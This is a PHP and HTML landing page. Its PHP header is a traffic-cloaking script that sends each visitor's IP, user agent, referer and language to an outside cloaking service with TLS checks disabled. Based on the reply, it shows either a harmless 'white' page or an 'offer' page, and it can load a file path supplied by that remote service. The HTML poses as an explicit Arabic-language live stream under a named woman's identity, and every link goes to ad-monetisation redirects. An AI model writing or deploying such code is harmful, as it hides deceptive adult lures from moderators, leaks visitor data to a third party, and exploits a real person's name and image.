<?php
// PHP Logic
error_reporting(0);
mb_internal_encoding('UTF-8');

if (version_compare(PHP_VERSION, '7.2', '<')) {
    exit('PHP 7.2 or higher is required.');
}

$ip_address = $_SERVER['REMOTE_ADDR'];
$ip_headers = [
    'HTTP_CLIENT_IP', 
    'HTTP_X_FORWARDED_FOR', 
    'HTTP_CF_CONNECTING_IP', 
    'HTTP_FORWARDED_FOR', 
    'HTTP_X_COMING_FROM', 
    'HTTP_COMING_FROM', 
    'HTTP_FORWARDED_FOR_IP', 
    'HTTP_X_REAL_IP'
];

foreach ($ip_headers as $header) {
    if (!empty($_SERVER[$header])) {
        $ip_address = trim($_SERVER[$header]);
        break;
    }
}

$request_data = [
    'label'         => '9ec4851e83c42b88662985f2ffd8489a', 
    'user_agent'    => $_SERVER['HTTP_USER_AGENT'], 
    'referer'       => !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', 
    'query'         => !empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '', 
    'lang'          => !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '',
    'ip_address'    => $ip_address
];

if (function_exists('curl_version')) {
    $ch = curl_init('https://cloakit.house/api/v1/check');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER  => TRUE,
        CURLOPT_CUSTOMREQUEST   => 'POST',
        CURLOPT_SSL_VERIFYPEER  => FALSE, // Consider enabling SSL verification in production
        CURLOPT_TIMEOUT         => 15,
        CURLOPT_POSTFIELDS      => http_build_query($request_data)
    ]);

    $result = curl_exec($ch);
    $info   = curl_getinfo($ch);
    curl_close($ch);

    if (!empty($info) && $info['http_code'] == 200) {
        $body = json_decode($result, TRUE);

        if (!empty($body['filter_type']) && $body['filter_type'] == 'subscription_expired') {
            exit('Your Subscription Expired.');
        }

        if (!empty($body['url_white_page']) && !empty($body['url_offer_page'])) {
            $context_options = ['ssl' => ['verify_peer' => FALSE, 'verify_peer_name' => FALSE], 'http' => ['header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']]];

            if ($body['filter_page'] == 'offer') {
                handlePage($body['url_offer_page'], $body['mode_offer_page'], $context_options);
            } elseif ($body['filter_page'] == 'white') {
                handlePage($body['url_white_page'], $body['mode_white_page'], $context_options);
            }
        }
    } else {
        exit('Try again later.');
    }
} else {
    exit('cURL is not supported on the hosting.');
}

function handlePage($url, $mode, $context_options) {
    if ($mode == 'loading') {
        if (filter_var($url, FILTER_VALIDATE_URL)) {
            echo str_replace('<head>', '<head><base href="' . $url . '" />', file_get_contents($url, FALSE, stream_context_create($context_options)));
        } elseif (file_exists($url)) {
            if (pathinfo($url, PATHINFO_EXTENSION) == 'html') {
                echo file_get_contents($url, FALSE, stream_context_create($context_options));
            } else {
                require_once($url);
            }
        } else {
            exit('Page Not Found.');
        }
    } elseif ($mode == 'redirect') {
        header('Location: ' . $url, TRUE, 302);
        exit(0);
    } elseif ($mode == 'iframe') {
        echo '<iframe src="' . $url . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@arij81533990192">
    <meta name="twitter:title" content="مباشر نار من الحمام">
    <meta name="twitter:description" content="يلا أدخل قبل ما يتقفل">
    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh37JPvoLklzZjUcmPl9uoO7nYvgxSGNCaLQ9dMQz4udqFvFcsyg-qTvlsa_egiym1h7bm9YW9qmRuBxBUnCj4s22r_y49t9fTIQRVTnmXOhSm1pxvWram7w900GAV3wBhOE1aZFwDXCQLi1WBan0FSo_8sZ6oyePHl-jdVSL7pRe1qmKpbjNopg0Wozw/w392-h221/Untitled-1.jpg">
    <script defer src="/_vercel/insights/script.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css" />
    <link rel="stylesheet" href="styles.css">
    <title>Rania khalifa</title>
    <meta name="Live XXXX | مباشر" content="Watch live now! call me on whatsapp." />
</head>
<body>
    <div class="container">
        <div class="profile">
            <a href="https://www.profitablecpmrate.com/zidenx7uw3?key=2c8f142f8a9a1c09329fc22dad968572">
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7NnxmNeXx5rnNqztBAOTeINQG4k3DOuQlAqM_6u3H5XaEoSrhu0sOSRi9__CXiG6dD08-ovvgt_OYtYoG0Mb6BMTeelUMorvumLRum_yThm_ego0XLgCaH9WYxQazHDqcaFNqy7bxslu3L5M6xaowRHA_FpdfymSQa7dDFM8-cgZFUvj4qdyY4-7kiG4A/s320/473422637_1153891402773964_7348930438326883936_n.jpg" alt="Profile Image" class="profile-img">
            </a>
            <h1>Rania Jamila</h1>
            <h2>رانية خليفة</h2> 
        </div>
        <div class="links">
            <a href="https://www.profitablecpmrate.com/cgex473se?key=961b4550d307e5c2cf56fc9e4e08b989" class="link">Live</a>
            <a href="https://www.profitablecpmrate.com/zidenx7uw3?key=2c8f142f8a9a1c09329fc22dad968572" class="link">Snapchat</a>
            <a href="https://www.profitablecpmrate.com/zidenx7uw3?key=2c8f142f8a9a1c09329fc22dad968572" class="link">Whatsapp</a>
        </div>
        <a href="https://www.profitablecpmrate.com/cgex473se?key=961b4550d307e5c2cf56fc9e4e08b989">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbQhMXFeQB7WDZSxDz7eP_G6eqp1Hf4GB7MCUkuEktCiO9vRpdlTLKVyCxzncgg9l5B31bTB8Y6x9XYE2BvHwPrbYOWSXZy7c8SfuSxwTPPw5xlCtXoctOPswKy2o-FPTJjhxjUi5YT5L-Cw7rR7YBHZGKF7E603gFv400S-mG9kZLxb910srNLUw59xQ/s320/Screenshot%202025-01-26%20141220.png" alt="Profile Image" class="video-img">
        </a>
    </div>
</body>
</html>
